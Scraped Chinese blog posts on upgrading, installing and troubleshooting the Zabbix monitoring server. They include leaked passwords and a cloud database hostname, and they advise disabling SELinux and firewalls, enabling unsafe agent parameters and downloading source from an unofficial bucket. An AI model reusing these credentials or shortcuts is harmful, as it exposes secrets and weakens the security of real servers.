MySQLIP地址 --opt --skip-lock-tables --flush-logs --database zabbix &gt; /tmp/zabbix.sqlmysqldump -uroot -p -P7306 --opt --skip-lock-tables --flush-logs --database zabbix3 --ignore-table=zabbix.history --ignore-table=zabbix.history_log --ignore-table=zabbix.history_str --ignore-table=zabbix.history_text --ignore-table=zabbix.history_uint --ignore-table=zabbix.trends --ignore-table=zabbix.trends_uint &gt;/root/zabbix20183026.sqlWarning: Using a password on the command line interface can be insecure.Warning: Using unique option prefix database instead of databases is deprecated and will be removed in a future release. Please use the full name instead.mysqldump: Got error: 1227: Access denied; you need (at least one of) the RELOAD privilege(s) for this operation when doing refresh提示：Login to mysql as root and enter your command:FLUSH PRIVILEGES; 注意：zabbix数据库备份可以备份整个/var/lib/zabbix目录下所有数据，但是文件比较大，很占空间。不建议这么做。所以我们这里只备份zabbix的表文件，历史数据和趋势数据的表不备份。 2.2 备份文件备份配置文件（通常是/etc/zabbix）、php网站源码、zabbix二进制文件（整个程序目录备份就OK） 123456789备份配置文件： mv /usr/local/zabbix/ /usr/local/zabbix.2.4.7备份启动脚本： mv /etc/init.d/zabbix_server /etc/init.d/zabbix_server.2.4.7 mv /etc/init.d/zabbix_agentd /etc/init.d/zabbix_agentd.2.4.7备份zabbix.php文件： mv /var/www/html/zabbix/ /var/www/html/zabbix.2.4.7 3、安装配置3.1 安装Zabbix server 重新安装新版本重头安装一次zabbix，也就是configure –… make make install.备注：一般高版本zabbix server兼容低版本zabbix客户端。如果发现有异常，那么你的zabbix客户端也相应升级一下。客户端升级比较简单：更新二进制文件，配置文件对照下是否有修改即可。 下载zabbix3.0版本，解压安装 123456789101112131415161718wget http://oak0aohum.bkt.clouddn.com/zabbix-3.0.3.tar.gz -c /tmp/cd /tmp/tar zxf zabbix-3.0.3.tar.gz./configure --prefix=/usr/local/zabbix --enable-server --with-mysql --with-net-snmp --with-libxml2 --with-libcurl --with-openipmi --enable-proxy --enable-agent --enable-java --with-ldap如果编译失败没有libxml2 ldap 需要yum安装下：yum install openldap openldap-devel libxml2* -y 编译成功这里会出现：************************************************************ Now run 'make install' ** ** Thank you for using Zabbix! ** &lt;http://www.zabbix.com&gt; ************************************************************#直接make install 安装即可： make install 这里编译安装 我加上了：–enable-java 这样防止后期监控tomcat需要重新编译。安装好以后： 3.2 检查配置文件zabbix_server.conf配置参数可能会有变化，修改变更后的参数，或者直接修改新的配置文件。 1.1 对照老版本的zabbix_server.conf进行修改，不能直接替换。 123456789101112131415vim /usr/local/zabbix/etc/LogFile=/tmp/zabbix_server.logDBHost=rdsm5t6w65741u8q1y53.mysql.rds.aliyuncs.comDBName=zabbixDBUser=zabbixDBPassword=zabbix2015StartPollers=12JavaGateway=127.0.0.1JavaGatewayPort=10052StartJavaPollers=5Timeout=4FpingLocation=/usr/local/fping/sbin/fpingLogSlowQueries=3000AlertScriptsPath=/usr/local/zabbix/share/zabbix/alertscripts 1.2 COPY相关脚本到新编译的目录下 12345678 cp /tmp/zabbix-3.0.3/misc/init.d/fedora/core/zabbix_server /etc/rc.d/init.d/zabbix_server[root@salt etc]# cp /tmp/zabbix-3.0.3/misc/init.d/fedora/core/zabbix_agentd /etc/rc.d/init.d/zabbix_agentdvim /etc/init.d/zabbix_server BASEDIR=/usr/local/zabbix/ vim /etc/init.d/zabbix_agentdBASEDIR=/usr/local/zabbix 1.3 alertscripts和externalscripts 里面的相关脚本复制到新的安装目录下。 12cp /usr/local/zabbix.2.4.7/share/zabbix/alertscripts/* /usr/local/zabbix/share/zabbix/alertscripts/.chown -R zabbix:zabbix /usr/local/zabbix/share/zabbix/alertscripts/* 4、 部署zabbix PHP源码4.1 将新的前端PHP代码也COPY到对应的目录下。 123456cd /tmp/cp -r /zabbix-3.0.3/frontends/php /var/www/html/zabbixcd /var/www/html/chown -R zabbix:zabbix zabbixcp zabbix.2.4.7/conf/zabbix.conf.php zabbix/conf/zabbix.conf.php 拷贝下php文件这样数据就能访问同步过来了。 然后重启服务。 发现出现500 网页无法显示，我去网上Google了下，说我的PHP文件版本过低。 我查看了下我的版本： 1234567php -versionPHP 5.3.3 (cli) (built: Feb 9 2016 10:36:17)Copyright (c) 1997-2010 The PHP GroupZend Engine v2.3.0, Copyright (c) 1998-2010 Zend Technologieswhereis phpphp: /usr/bin/php /etc/php.d /etc/php.ini /usr/lib64/php /usr/share/php /usr/share/man/man1/php.1.gz 查询了下这是默认安装的，yum安装的。 mv /usr/share/php/ /usr/share/php.5.3.3备份之前的方便回滚，然后升级PHP： 快速将PHP 5.3升级至PHP 5.5CentOS 6.7以下为 CentOS 下安装 PHP 方法： 添加 epel 源 1# rpm -Uvh http://download.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm 添加 remi 源 1# rpm -Uvh http://rpms.famillecollet.com/enterprise/remi-release-6.rpm 安装 PHP 1# yum --enablerepo=remi,remi-php55 install php-fpm php-common php-devel php-mysqlnd php-mbstring php-mcrypt 查看 PHP 版本 1234# php -vPHP 5.5.9 (cli) (built: Feb 11 2014 08:25:33)Copyright (c) 1997-2014 The PHP GroupZend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies 启动 php-fpm 12# service php-fpm startStarting php-fpm: [ OK ] 这里重启完以后，记得要让php生效，不然的话不行。 我一开始刷新还是出现了500错误，后来用php指针测试了下版本是多少？ www站点添加。info.php 12345&lt;?php phpinfo();?&gt;; 访问地址/info.php 出现版本是5.3 环境问题，重启http就可以了。 这里已经搞定咯。 如果出现图形乱码：可以参考下面的文档。 其实把之前的字体拷贝过去，然后先修改下配置文件即可。 1cp /var/www/html/zabbix.2.4.7/fonts/simkai.ttf /var/www/html/zabbix/fonts/. 3.0版本升级以后其实就是个数据库不变，其他的重新安装一遍即可。 10多分钟就可以搞定的。 升级遇到的问题 The frontend does not match Zabbix database. Current database version (mandatory/optional): 2050119/2050119. Required mandatory version: 3000000. Contact your system administrator.登录到数据库执行下面的sql,就可以修复这个问题 1mysql&gt;update dbversion set mandatory=3000000; 2 zabbix 内存溢出跑了新版本1天，老是启动不起来zabbix_server ，看日志出现下列问题 123456789101112131415161718192021222316701:20140925:191733.530 Starting Zabbix Server. Zabbix 3.0.3 (revision 48953).16701:20140925:191733.530 ****** Enabled features ******16701:20140925:191733.530 SNMP monitoring: YES16701:20140925:191733.530 IPMI monitoring: YES16701:20140925:191733.530 WEB monitoring: YES16701:20140925:191733.530 VMware monitoring: NO16701:20140925:191733.530 Jabber notifications: NO16701:20140925:191733.530 Ez Texting notifications: YES16701:20140925:191733.530 ODBC: NO16701:20140925:191733.530 SSH2 support: NO16701:20140925:191733.531 IPv6 support: NO16701:20140925:191733.531 ******************************16701:20140925:191733.531 using configuration file: /opt/zabbix/etc/zabbix_server.conf15996:20140925:191145.759 completed 97% of database upgrade15996:20140925:191147.139 completed 98% of database upgrade15996:20140925:191147.422 completed 99% of database upgrade15996:20140925:191147.428 completed 100% of database upgrade15996:20140925:191147.428 database upgrade fully completed15996:20140925:191148.800 __mem_malloc: skipped 0 asked 48 skip_min 0 skip_max 429496729515996:20140925:191148.800 [file:dbconfig.c,line:445] zbx_mem_malloc(): out of memory (requested 44 bytes)15996:20140925:191148.800 [file:dbconfig.c,line:445] zbx_mem_malloc(): please increase CacheSize configuration parameter15996:20140925:191148.800 [file:dbconfig.c,line:445] zbx_mem_malloc(): out of memory (requested 44 bytes)15996:20140925:191148.800 [file:dbconfig.c,line:445] zbx_mem_malloc(): please increase CacheSize configuration parameter 解决打开zabbix_server.conf找到 Option: CacheSize把原来的# CacheSize=8M 前面的#注释去掉，将8M修改为1024，这个1024根据服务器性能修改。 交流学习：🐧 Linux shell_高级运维派: 459096184 圈子 (系统运维-应用运维-自动化运维-虚拟化技术研究欢迎加入)🐧 BigData-Exchange School : 521621407 圈子（大数据运维)（Hadoop开发人员)（大数据研究爱好者) 欢迎加入 相应Bidata有内部微信交流群互相学习，加入QQ群有链接。","link":"/2016/06/18/性能监控/Zabbix/zabbix-server2-4全新升级3-0版本/"},{"title":"zabbix-server3.0.3版本环境安装部署","text":"系统环境： 192.168.1.170 MySQL主 192.168.1.183 zabbix-server CentOS Linux release 7.2.1511 (Core) zabbix源码下载 : http://www.zabbix.com/download.php 依赖下载： https://github.com/zabbixcn/curl-rpm/tree/master/RPMS zabbix Down下载安装包：http://repo.zabbix.com/zabbix/3.2/rhel/6/x86_64/ zabbix3.2 http://jaist.dl.sourceforge.net/project/zabbix/ZABBIX%20Latest%20Stable/3.2.4/zabbix-3.2.4.tar.gz 第一步zabbix：关闭本机上的selinux与iptables服务 1、关闭SELinux 123456#下面的命令实现永久关闭SELinux sed -i 's/^SELINUX=.*/#&amp;/;s/^SELINUXTYPE=.*/#&amp;/;/SELINUX=.*/a SELINUX=disabled' /etc/sysconfig/selinux#下面的命令实现临时关闭SELinux/usr/sbin/setenforce 0/usr/sbin/setenforce: SELinux is disabled 也可以设置开放端口出去。 CentOS 7.0默认使用的是firewall作为防火墙，这里改为iptables防火墙。 firewall： 123systemctl start firewalld.service#启动firewallsystemctl stop firewalld.service#停止firewallsystemctl disable firewalld.service#禁止firewall开机启动 CentOS7默认的防火墙不是iptables,而是firewalle.centos 7 的默认没有安装iptables 需要安装： 123yum install iptables-services#保存上述规则 service iptables save 等会再添加端口：10050 ，10051 搭建LAMP环境，或LNMP环境 1yum install mysql-server httpd php –y 安装其它依赖包 1yum install mysql-devel gcc net-snmp-devel curl-devel perl-DBI php-gd php-mysql php-bcmath php-mbstring php-xml –y gcc OpenIPMI-devel net-snmp-devel.x86_64 libxml2-devel mysql-devel 这里MySQL我已经在MySQL服务器上面安装好了。只需要创建个新的zabbix数据库即可。 增加zabbix用户和组 12groupadd zabbixuseradd –g zabbix –m zabbix 下载zabbix3.0版本，解压安装 123456789101112131415wget http://oak0aohum.bkt.clouddn.com/zabbix-3.0.3.tar.gz -c /tmp/cd /tmp/tar zxf zabbix-3.0.3.tar.gz./configure --prefix=/usr/local/zabbix --enable-server --with-mysql --with-net-snmp --with-libxml2 --with-libcurl --with-openipmi --enable-proxy --enable-agent --enable-java --with-ldap编译成功这里会出现：************************************************************ Now run 'make install' ** ** Thank you for using Zabbix! ** &lt;http://www.zabbix.com&gt; ************************************************************#直接make install 安装即可： make install 这里编译安装 我加上了：–enable-java 这样防止后期监控tomcat需要重新编译。 3.配置数据库 登陆到192.168.1.170服务器上面： 12# mysql -e \"create database zabbix character set utf8 collate utf8_bin;\" #修改时区# mysql -e \"grant all privileges on zabbix.* to zabbix@localhost identified by 'zabbix';\" #创建数据库名 这里我设置了只能192.168.1.0网段可以访问数据库。 所以这里创建数据库直接这么操作了。 1234567891011121314151617181920[root@mysql ~]# mysql -uroot -pIhaozhuo_b313 -h 192.168.1.170Warning: Using a password on the command line interface can be insecure.Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 10Server version: 5.6.20-log MySQL Community Server (GPL)Copyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.mysql&gt; create database zabbix character set utf8 collate utf8_bin;Query OK, 1 row affected (0.06 sec)mysql&gt; GRANT ALL ON zabbix.* TO 'zabbix'@'192.168.1.%' IDENTIFIED BY 'zabbix123.com';Query OK, 0 rows affected (0.00 sec)mysql&gt; flush privileges;Query OK, 0 rows affected (0.00 sec) 四.导入数据库文件：1cd /usr/share/doc/zabbix-server-mysql-2.4.8/create 操作三条命令把数据导入到在指定的MySQL：zabbix 123mysql -uzabbix -pzabbix123.com -h 192.168.1.170 zabbix &lt; schema.sqlmysql -uzabbix -pzabbix123.com -h 192.168.1.170 zabbix &lt; images.sqlmysql -uzabbix -pzabbix123.com -h 192.168.1.170 zabbix &lt; data.sql 五、配置文件及web前端文件修改添加服务端口 vi /etc/services #编辑，在最后添加以下代码 123456# Zabbixzabbix-agent 10050/tcp # Zabbix Agentzabbix-agent 10050/udp # Zabbix Agentzabbix-trapper 10051/tcp # Zabbix Trapperzabbix-trapper 10051/udp # Zabbix Trapper:wq! #保存退出 添加后如下 12345# grep zabbix /etc/serviceszabbix-agent 10050/tcp #ZabbixAgentzabbix-agent 10050/udp #ZabbixAgentzabbix-trapper 10051/tcp #ZabbixTrapperzabbix-trapper 10051/udp #ZabbixTrapper 修改zabbix配置文件 vim /usr/local/zabbix/etc/zabbix_server.conf 12345DBName=zabbix #数据库名称DBUser=zabbix #数据库用户名DBPassword=zabbix123.com #数据库密码ListenIP=192.168.1.170 #数据库ip地址AlertScriptsPath=/usr/local/zabbix/share/zabbix/alertscripts #zabbix运行脚本存放目录 :wq! #保存退出 1234vi /usr/local/zabbix/etc/zabbix_agentd.confInclude=/usr/local/zabbix/etc/zabbix_agentd.conf.d/UnsafeUserParameters=1 #启用自定义key:wq! #保存退出 1.2 COPY相关脚本到新编译的目录下 123456789101112131415161718 cp /tmp/zabbix-3.0.3/misc/init.d/fedora/core/zabbix_server /etc/rc.d/init.d/zabbix_server[root@salt etc]# cp /tmp/zabbix-3.0.3/misc/init.d/fedora/core/zabbix_agentd /etc/rc.d/init.d/zabbix_agentd修改脚本路径：vim /etc/init.d/zabbix_server BASEDIR=/usr/local/zabbix/vim /etc/init.d/zabbix_agentdBASEDIR=/usr/local/zabbix chmod +x /etc/rc.d/init.d/zabbix_server #添加脚本执行权限chmod +x /etc/rc.d/init.d/zabbix_agentd #添加脚本执行权限chkconfig zabbix_server on #添加开机启动chkconfig zabbix_agentd on #添加开机启动 八、配置web站点 1234cd zabbix-2.4.8cp -r /zabbix-2.4.8/frontends/php /var/www/html/zabbixcd /var/www/html/chown -R zabbix:zabbix zabbix service zabbix_server start #启动zabbix服务端 service zabbix_agentd start #启动zabbix客户端 然后重启服务。 发现出现500 网页无法显示，我去网上Google了下，说我的PHP文件版本过低。 我查看了下我的版本： 1234567php -versionPHP 5.3.3 (cli) (built: Feb 9 2016 10:36:17)Copyright (c) 1997-2010 The PHP GroupZend Engine v2.3.0, Copyright (c) 1998-2010 Zend Technologieswhereis phpphp: /usr/bin/php /etc/php.d /etc/php.ini /usr/lib64/php /usr/share/php /usr/share/man/man1/php.1.gz 查询了下这是默认安装的，yum安装的。 mv /usr/share/php/ /usr/share/php.5.3.3备份之前的方便回滚，然后升级PHP： 快速将PHP 5.3升级至PHP 5.5CentOS 6.7以下为 CentOS 下安装 PHP 方法： 添加 epel 源 1# rpm -Uvh http://download.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm 添加 remi 源 1# rpm -Uvh http://rpms.famillecollet.com/enterprise/remi-release-6.rpm 安装 PHP 1# yum --enablerepo=remi,remi-php55 install php-fpm php-common php-devel php-mysqlnd php-mbstring php-mcrypt 查看 PHP 版本 1234# php -vPHP 5.5.9 (cli) (built: Feb 11 2014 08:25:33)Copyright (c) 1997-2014 The PHP GroupZend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies 启动 php-fpm 12# service php-fpm startStarting php-fpm: [ OK ] 这里重启完以后，记得要让php生效，不然的话不行。 我一开始刷新还是出现了500错误，后来用php指针测试了下版本是多少？ www站点添加。info.php 12345&lt;?php phpinfo();?&gt;; 访问地址/info.php 出现版本是5.3 环境问题，重启http就可以了。 这里已经搞定咯。 如果出现图形乱码：可以参考下面的文档。 其实把之前的字体拷贝过去，然后先修改下配置文件即可。 1cp /var/www/html/zabbix.2.4.7/fonts/simkai.ttf /var/www/html/zabbix/fonts/. zabbix-server2.4服务端编译安装 zabbix-server服务端编译安装 zabbix2.4监控80端口状态 : zabbix监控80端口状态 zabbix+Grafana安装使用监控结合 ：zabbix+Grafana安装使用监控结合 zabbix监控MySQL-添加自定义监控项 : zabbix监控MySQL-添加自定义监控项 zabbix的ICMP_Ping模版实现对客户端网络状态的监控 : zabbix的ICMP_Ping模版实现对客户端网络状态的监控 zabbix性能监控故障总结 zabbix性能监控故障总结","link":"/2016/06/19/性能监控/Zabbix/zabbix-server3-0-3版本环境安装部署/"},{"title":"zabbix性能监控故障总结","text":"TOC效果如下：[TOC] 1.Zabbix红色弹出报错 zabbix server is not running: the information displayed may not be current123456789101112131415161718192021222324252627* 排错:* 1. 检查 /var/www/html/zabbix/conf/zabbix.conf.php 确定 $DB['DATABASE'] 数据库$DB['USER'] 用户$DB['PASSWORD'] 密码这三个参数都是正确的。 注意：每次改了参数文件一定要记得重启zabbix_server这里都没问题。2. 关闭SELinux的方法:修改/etc/selinux/config文件中的SELINUX=\"\" 为 disabled ，然后重启。如果不想重启系统，使用命令setenforce 0注:setenforce 1 设置SELinux 成为enforcing模式setenforce 0 设置SELinux 成为permissive模式 在lilo或者grub的启动参数中增加：selinux=0,也可以关闭selinuxselinux是否关闭。一定要关闭这个，开启selinux会引起一连串问题，甚至zabbix的discovery功能也不能正常使用3. 上面都没有问题然后在查看服务是否正常启动。查看/tmp/zabbix_server.log和/tmp/zabbix_agent.log无任何异常。如果日志提示查找不到主机名，我们看下服务是否启动。4. 看zabbix_server和zabbix_agent进程、端口都正常 netstat -ntulp如果没有启动 需要手动启动下，这里可能服务没有启动，启动服务即可。 2.Zabbix-agentd日志报错Get value from agent failed: cannot connect to [[192.168.1.218]:10050]: [113] No route to host12345678* 排错:看提示“No route to host”，与网络连接有关。排除的方法如下:a）查看192.168.30.3这台机器是否已开机b)在zabbix server端向这台机器ping，看网络是否通c）用telnet 登录10050和10051端口，看该主机是否允许这两个端口通讯d)查看iptables防火墙规则是否拦截10050、10051端口 3.时间不同步Check if client local time is in sync with Zabbix server time123456789101112131415因为我在我的网络中的一些NTP服务器，这将是很好能够测量主机和这些服务器之一之间的时间差。可悲的是，这几乎是不可能的。但有一个解决方案:`system.localtime.fuzzytime`，照顾这只是一个!!!触发的“fuzzytime”功能发出警报，如果被监控服务器的时间漂移。它比较报告主机的时间的zabbix服务器在触发器被处理的时间上的时间。fuzzytime（秒），可能是（浮点，整数）:返回1，如果时间戳（项目值）不从的zabbix服务器时间有所不同超过N秒，0 -否则通常用于system.localtime检查本地时间在服务器的zabbix本地时间同步。注:添加公式时，使用“添加”按钮，在右侧，这是很简单的这种方式！系统时间跟我现在北京时间不同步。date -R 查看下需要手动添加计划任务同步下，设置开机启动。这里IP是zabbix-server IP00 * * * * /usr/sbin/ntpdate 192.168.47.20 &gt;/dev/null 2&gt;&amp;1 还有不懂得可以看:参考 4.MySQL内存不够 Lack of available memory on server MySQL12345故障原因:Lack of available memory on server argus047072需要添加内存故障原因:Redis链接数超过最大客户端数量限制。是否有大量的进程在后台运行 5.Zabbix-agent不通Received empty response from Zabbix Agent123456789出现如下错误:Received empty response from Zabbix Agent at [192.168.1.2]. Assuming that agent dropped connection because of access permission大概意思是说没有权限访问agent端口10050，解决方法如下:# cat zabbix_agentd.conf| grep Server=Server=192.168.1.2 # zabbix server ip地址如果你的server有多个IP地址，使用逗号分隔多个IP地址。 6.Zabbix报错磁盘不足Free disk space is less than 20% on volume /home1234567891011121314151617181920212223磁盘总共大小du -Th定位查看是什么消耗那么多磁盘空间，查看home目录。du -s -h /srv/tomcat/tomcat_account/logs/* | sort1G localhost.2015-12-21.log2G localhost.2015-12-22.log2G localhost.2015-12-23.log.....find /srv/tomcat/tomcat_account/logs/ -mtime +1 -name \"*.log\" -exec rm -rf &#123;&#125; \\;这个保留前一天的日志其余都删除。1. 计划任务脚本清除前一天00 00 * * * find /home/admin/output/ -mtime +1 -exec rm &#123;&#125; \\;2. 或者使用脚本放到计划任务里面跑1 0 * * * /opt/soft/log/qingli-log.sh &gt;/dev/null 2&gt;&amp;1这里的设置是每天凌晨0点1分执行qingli-log.sh .sh文件进行数据清理任务了。在查看磁盘总共大小 7.Zabbix监控报错zabbix server is not running: the information displayed may not be current1234567故障原因:Zabbix agent on labs047093 is unreachable for 5 minutesZabbix使用一段时间后总是报Zabbix Agent不可到达解决结果:这三台机器网络不通，ssh连接不上，排错方法查看日志是否有报错，是否服务没有起来。如果数据库服务器是一直正常的，SELinux是事先关闭没有，修改完上述所提到的后发现问题依然。Zabbix依然报错（Zabbix Server Messages: PROBLEM: Zabbix agent on Zabbix server is unreachable for 5 minutes。查看日志报什么错，定位解决问题，一般出现这个大部分数据延迟导致，在图形上面明显看到有4到5分钟数据是空白的。 8.Zabbix图形出现乱码或者没有文字参考文档:zabbix2.4图形乱码 9.Zabbix监控之邮件告警发送失败smtp-server: 错误代码550与535参考文档:zabbix163邮件告警错误代码 10.Zabbix中提示：Lack of free swap space on hostname12345678910111213141516171819202122232425262728293031323334提示：缺交换空间可以创建也可以不用创建。[root@xx ~]# free -m total used free shared buffers cachedMem: 3832 3488 343 0 267 2389-/+ buffers/cache: 831 3000swap: 0 0 0个般物理机不可能不设交换分区，显然这样的设计没有考虑到云主机用户。只需要调节监控文件，即可解决问题：解决此问题的步骤如下:选择 Configuration-&gt;Templates(模板),在模板界面中选择Template OS Linux右侧的Triggers（触发器）,在触发器页面中打开Lack of free swap space on &#123;HOST.NAME&#125;项目,在新打开的触发器编辑页面中修改Expression（表达式）的内容,由原先的&#123;Template OS Linux:system.swap.size[,pfree].last(0)&#125;&lt;50修改为&#123;Template OS Linux:system.swap.size[,pfree].last(0)&#125;&lt;50 and &#123;Template OS Linux:system.swap.size[,free].last(0)&#125;&lt;&gt;0 此处修改增加了“and&#123;Template OS Linux:system.swap.size[,free].last(0)&#125;&lt;&gt;0”判断系统有交换空间，当系统无交换空间&#123;Template OSLinux:system.swap.size[,free].last(0)&#125;的值为0时将不会使表达式成立，也就不会触发错误提示。保存后在下一个更新周期内zabbix之前报告“Lack of free swap space”问题就会被自动标记为Resolved.或者创建：1、首先看一下内存free -m2、然后创建一个分区添加交换文件mkdir /etc/swap/dd if=/dev/zero of=/etc/swap/swap bs=1024 count=1024000 1个G3、创建交换空间mkswap /etc/swap/swap4、启动交换空间swapon /etc/swap/swap5、查看新增空间free -tom6、修改/etc/fstab文件使系统在重新启动的时候生效/etc/swap/swap swap swap defaults 0 0 11.Zabbix-agent日志端hostname不一致：cannot send list of active checks to [192.168.0.1]: host [Zabbix server] not found123456查看被监控机上的/tmp/zabbix_agentd.log，显示日志：No active checks on server: host [Zabbix server] not found这是因为，通过zabbix dashboard页面配置的被监控主机名跟被监控主机上zabbix_agentd.conf中配置的Hostname不一致。修改为一致的名字后，重启zabbix_agentd即可。 12.解决CentOS 7安装zabbix 3.0 无法启动zabbix-server的问题12345678910[root@kvm zabbix_agentd.d]# service zabbix-agent restartRedirecting to /bin/systemctl restart zabbix-agent.serviceJob for zabbix-agent.service failed because a configured resource limit was exceeded. See \"systemctl status zabbix-agent.service\" and \"journalctl -xe\" for details.解决方案:关闭SELinux服务 。 执行命令setenforce 0 3. 重启zabbixsystemctl restart zabbix-server.service 13.zabbix 返回值为空 键值模板报错：Received value [] is not suitable for value type [Numeric (unsigned)] and data type [Decimal]1234567891011解决：本地脚本获取值有返回，脚本没有zabbix赋权~监控端执行脚本：[root@jollychic-db-slave4 zabbix]# sh mysql3307.sh Qcache_queries_in_cache87zabbix 服务端：[root@yum-zabbix ~]# zabbix_get -s 10.155.74.247 -k mysql.status3307[Threads_running]返回空这里就是脚本没有zabbix赋权~这里脚本需要添加下-h127.0.0.1 即可 14.解决Zabbix“ZBX_NOTSUPPORTED: Timeout while executing a shell script”12345678910111213141516解决方案（1）修改zabbix_server的zabbix_server.conf：[root@nmp01 scripts]# vim /usr/local/zabbix/etc/zabbix_server.conf修改以下参数：Timeout=30注：超时时间为30秒（2）修改脚本所在zabbix_agentd的zabbix_agentd.conf：vim /usr/local/zabbix/etc/zabbix_agentd.conf修改以下参数：Timeout=30（3）重启zabbix服务端和脚本所在客户端：service zabbix_server restartservice zabbix_agentd restart 15.Zabbix3.0 poller processes more than 75% busy警报处理告警原因： 1.某个进程卡住了，2.僵尸进程出错，太多，导致慢了3.网络延迟（可忽略）4.zabbix消耗的内存多了 一：简单，粗暴（重启zabbix-server可结合定时任务使用） 虽然Zabbix的监控警报各种有，但yancy使用碰到最多的几个莫过于内存耗尽，网络不通，IO太慢还有这个“Zabbix poller processes more than 75% busy”了。一开始的时候因为这个即不影响使用也持续一会儿就自行解决就没有多在意。然后随着数据库的增大，Zabbix消耗的内存可是越来越多，Poller processes（轮询）开始天天Busy了，最终yancy不得不把Zabbix挪到了另外一台服务器上。 但这并没有彻底解决问题，警报仍然三天两头来几个。之后Kaijia开启了Zabbix警报的邮件功能，于是开始频繁收到这类邮件，于是Kaijia决定解决这个问题。Google了一下资料，没有找到很权威的答案，造成轮询忙的问题有很多中，支撑Zabbix的MySQL卡住了，Zabbix服务器的IO卡住了都有可能，Zabbix进程分配到内存不足都有可能。一个简单的方法是增加Zabbix Server启动时初始化的进程数量，这样直接增加了轮询的负载量，从比例上来讲忙的情况就少了。 增加初始化进程的方法非常简单，编辑Zabbix Server的配置文件/etc/zabbix/zabbix_server.conf，找到配置StartPollers的段落： 12345671. ### Option: StartPollers2. # Number of pre-forked instances of pollers.3. #4. # Mandatory: no5. # Range: 0-10006. # Default:7. # StartPollers=5 取消StartPollers=一行的注释或者直接在后面增加： 1StartPollers=10 因为之前zabbix除了单独跑一个server服务还有agent还有grafana-server还有代理，后面我先扩大内存和服务器CPU.将StartPollers改成多少取决于服务器的性能和监控的数量，Kaijia将StartPollers设置成12之后就再没有遇到过警报。如果内存足够的话可以设置更高。设置完成之后运行： 1service zabbix-server restart 重启Zabbix。当然另外一种从整体上降低Zabbix服务器负载的方法就是定期重启Zabbix，这种方法可以用Cron实现，运行： 1crontab -e 在调出的Cron编辑器中增加一个计划： 100 * * * * service zabbix-server restart &gt; /dev/null 2&gt;&amp;1 这个计划会每天自动重启Zabbix服务以结束僵尸进程并清理内存等。目前Kaijia这样配置Zabbix后还没有再次遇到过“Zabbix poller processes more than 75% busy”的问题。 16、Zabbix3.0-monitoring出现乱码出现乱码： 乱码安装包下载地址：中文汉化乱码包 123456789101112131415* 参考文档：zabbix版本都已有汉化功能了，直接选择中文就行。可是低版本的就需要安装汉化，可是发现打开图形界面是空白图形：遇到中文乱码问题。zabbix乱码是怎么照成的呢？zabbix使用DejaVuSan.ttf字体，不支持中文，导致中文出现乱码。解决方法很简单，把我们电脑里面字体文件传到zabbix服务器上。* 在zabbix-server端上面进入安装目录：var/www/html/zabbix/fonts目录下面查看，发现之前上传字体的文件名后缀是.ttc，猜着一般见到的都后缀都是ttf的，会不会是这个问题导致的呢。于是在windows系统上找到simkai.ttf,上传到fonts下，编辑/var/www/html/zabbix/include/defines.inc.php，更改两处地方： define(‘ZBX_FONT_NAME‘, ‘simkai‘); define(‘ZBX_GRAPH_FONT_NAME‘, ‘simkai‘);fzytk 设置好了，服务重启下，刷新，图下面就有字体了： graphfont 常见问题： 123456789依旧乱码：通过以上的操作，大部分同学的乱码问题解决了，但是依旧有一些同学还是乱码？细心的群友提供另外一种情况：初始化数据库的时候未使用utf8编码所致.初始化数据库使用命令create database zabbix default charset utf8;或者my.cnf增加如下配置default-character-set = utf8总结 乱码处理方法很简单，实际上就是替换字体。 交流学习：🐧 Linux shell_高级运维派: 459096184 圈子 (系统运维-应用运维-自动化运维-虚拟化技术研究欢迎加入)🐧 BigData-Exchange School : 521621407 圈子（大数据运维)（Hadoop开发人员)（大数据研究爱好者) 欢迎加入 相应Bidata有内部微信交流群互相学习，加入QQ群有链接。","link":"/2014/10/04/性能监控/Zabbix/zabbix-故障总结/"},{"title":"zabbix2.4服务端rpm快速安装部署","text":"系统环境： 192.168.1.170 MySQL主 192.168.1.183 zabbix-server Zabbix 快速部署（RPM）注释：安装环境为系统最小安装，注意时间同步 12[root@docker ~]# cat /etc/redhat-releaseCentOS Linux release 7.2.1511 (Core) 关闭SELinux：1、临时关闭（不用重启机器）： #setenforce 0 ##设置SELinux 成为permissive模式 #setenforce 1 ##设置SELinux 成为enforcing模式 1.配置官方yum： cnetos 32位：#rpm -ivh http://repo.zabbix.com/zabbix/2.4/rhel/6/i386/zabbix-release-2.4-1.el6.noarch.rpm cnetos 64位：#rpm -ivh http://repo.zabbix.com/zabbix/2.4/rhel/6/x86_64/zabbix-release-2.4-1.el6.noarch.rpm centos7 64位：# rpm -ivh http://repo.zabbix.com/zabbix/2.4/rhel/7/x86_64/zabbix-release-2.4-1.el7.noarch.rpm 如果选择这个方式是安装最高的2.4.8版本 2.安装Zabbix：12#yum -y install zabbix-server-mysql zabbix-web-mysql zabbix-agent mysql-server mysql #安装相关软件包#yum -y install zabbix-get zabbix-sender #方便以后对zabbix调试用 3.配置数据库 登陆到192.168.1.170服务器上面： 12# mysql -e \"create database zabbix character set utf8 collate utf8_bin;\" #修改时区# mysql -e \"grant all privileges on zabbix.* to zabbix@localhost identified by 'zabbix';\" #创建数据库名 这里我设置了只能192.168.1.0网段可以访问数据库。 所以这里创建数据库直接这么操作了。 1234567891011121314151617181920 [root@mysql ~]# mysql -uroot -pIhaozhuo_b313 -h 192.168.1.170Warning: Using a password on the command line interface can be insecure.Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 10Server version: 5.6.20-log MySQL Community Server (GPL)Copyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.mysql&gt; create database zabbix character set utf8 collate utf8_bin;Query OK, 1 row affected (0.06 sec)mysql&gt; GRANT ALL ON zabbix.* TO 'zabbix'@'192.168.1.%' IDENTIFIED BY 'zabbix123.com';Query OK, 0 rows affected (0.00 sec)mysql&gt; flush privileges;Query OK, 0 rows affected (0.00 sec) 4.导入数据库文件： 1cd 